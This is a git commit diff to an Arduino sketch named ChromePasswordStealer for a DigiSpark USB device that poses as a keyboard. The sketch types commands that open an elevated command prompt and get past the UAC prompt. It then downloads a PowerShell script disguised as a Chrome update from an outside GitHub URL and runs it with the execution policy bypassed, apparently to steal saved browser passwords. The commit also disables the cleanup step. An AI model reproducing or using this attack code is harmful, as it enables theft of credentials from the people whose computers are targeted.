ac5408852f29bcc58cf52d15c550f60b8d1253b3
abdulaziesmuslim <abdulazies55@gmail.com>
2020-05-21 17:21:14 +0700

    Ganti .exe

--- ChromePasswordStealer/ChromePasswordStealer.ino
+++ ChromePasswordStealer/ChromePasswordStealer.ino
@@ -8,11 +8,18 @@ void setup()
   digitalWrite(1, LOW);
   DigiKeyboard.sendKeyStroke(0);
   DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
-  DigiKeyboard.delay(100);
-  DigiKeyboard.println("cmd");
+  DigiKeyboard.delay(500);
+  DigiKeyboard.println("powershell Start-Process cmd -Verb RunAs");
+  DigiKeyboard.delay(500);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(100);  
-  DigiKeyboard.println("cd / & mkdir chrome & cd chrome & echo (wget 'https://raw.githubusercontent.com/abdulaziesmuslim/TA/master/ChromeUpdateDownload.ps1' -OutFile ChromeUpdateDownload.ps1) > b.ps1");
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(500);  
+  DigiKeyboard.println("cd / & mkdir chrome & cd chrome");
+  DigiKeyboard.delay(50);
+  DigiKeyboard.println("echo (wget 'https://raw.githubusercontent.com/abdulaziesmuslim/TA/master/ChromeUpdateDownload.ps1' -OutFile ChromeUpdateDownload.ps1) > b.ps1");
   DigiKeyboard.delay(50);
   DigiKeyboard.println("powershell -ExecutionPolicy ByPass -File b.ps1");
   DigiKeyboard.delay(20);  
@@ -23,7 +30,7 @@ void setup()
   DigiKeyboard.println("powershell ./maintenance.ps1");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(50);
-  DigiKeyboard.println("cd C:/");
+  /*DigiKeyboard.println("cd C:/");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(50);
   DigiKeyboard.println("rmdir /s /q chrome");
@@ -31,9 +38,9 @@ void setup()
   DigiKeyboard.delay(50);
   DigiKeyboard.println("exit");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(50);
+  DigiKeyboard.delay(50);*/
   digitalWrite(1, HIGH);
 }
 
 /* Unused endless loop */
-void loop() {}
+void loop() {}  
